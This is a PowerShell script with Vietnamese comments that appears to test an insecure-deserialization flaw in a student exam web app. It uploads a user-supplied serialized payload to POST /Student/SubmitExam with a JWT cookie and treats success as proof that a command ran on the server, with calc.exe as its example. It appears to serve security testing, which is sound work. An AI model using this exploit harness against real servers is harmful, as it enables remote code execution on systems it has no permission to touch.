# PowerShell script để test khai thác Insecure Deserialization
# API endpoint: POST /Student/SubmitExam

param(
    [Parameter(Mandatory=$true)]
    [string]$BaseUrl,
    
    [Parameter(Mandatory=$true)]
    [string]$JwtToken,
    
    [Parameter(Mandatory=$true)]
    [int]$ExamId,
    
    [Parameter(Mandatory=$true)]
    [string]$PayloadFile
)

Write-Host "=== Test Insecure Deserialization Exploit ===" -ForegroundColor Cyan
Write-Host ""

# Kiểm tra file payload tồn tại
if (-not (Test-Path $PayloadFile)) {
    Write-Host "✗ File payload không tồn tại: $PayloadFile" -ForegroundColor Red
    exit 1
}

$url = "$BaseUrl/Student/SubmitExam"
Write-Host "[*] URL: $url" -ForegroundColor Yellow
Write-Host "[*] Exam ID: $ExamId" -ForegroundColor Yellow
Write-Host "[*] Payload File: $PayloadFile" -ForegroundColor Yellow
Write-Host ""

# Tạo multipart form data
$boundary = [System.Guid]::NewGuid().ToString()
$fileBytes = [System.IO.File]::ReadAllBytes($PayloadFile)
$fileName = Split-Path $PayloadFile -Leaf

$bodyLines = @(
    "--$boundary",
    "Content-Disposition: form-data; name=`"examId`"",
    "",
    "$ExamId",
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
    "Content-Type: application/octet-stream",
    "",
    ""
)

$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes(($bodyLines -join "`r`n") + "`r`n")
$bodyBytes += $fileBytes
$bodyBytes += [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")

# Tạo request
$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}

$cookies = New-Object System.Net.CookieContainer
$cookie = New-Object System.Net.Cookie("access_token", $JwtToken, "/", $([System.Uri]$BaseUrl).Host)
$cookies.Add($cookie)

try {
    $request = [System.Net.WebRequest]::Create($url)
    $request.Method = "POST"
    $request.ContentType = "multipart/form-data; boundary=$boundary"
    $request.CookieContainer = $cookies
    $request.ContentLength = $bodyBytes.Length
    
    Write-Host "[*] Đang gửi request..." -ForegroundColor Yellow
    
    $requestStream = $request.GetRequestStream()
    $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
    $requestStream.Close()
    
    $response = $request.GetResponse()
    $responseStream = $response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($responseStream)
    $responseText = $reader.ReadToEnd()
    
    Write-Host ""
    Write-Host "[+] Status Code: $($response.StatusCode.value__)" -ForegroundColor Green
    Write-Host "[+] Response:" -ForegroundColor Green
    Write-Host $responseText -ForegroundColor White
    
    if ($response.StatusCode.value__ -eq 200) {
        Write-Host ""
        Write-Host "[!] PAYLOAD ĐÃ ĐƯỢC DESERIALIZE!" -ForegroundColor Red
        Write-Host "[!] Command trong payload đã được thực thi trên server" -ForegroundColor Red
        Write-Host "[!] Kiểm tra server để xác nhận command đã chạy (ví dụ: calc.exe đã mở)" -ForegroundColor Yellow
    }
    
    $reader.Close()
    $responseStream.Close()
    $response.Close()
}
catch {
    Write-Host ""
    Write-Host "✗ Lỗi: $_" -ForegroundColor Red
    if ($_.Exception.Response) {
        $errorStream = $_.Exception.Response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($errorStream)
        $errorText = $reader.ReadToEnd()
        Write-Host "Error Response: $errorText" -ForegroundColor Red
    }
}

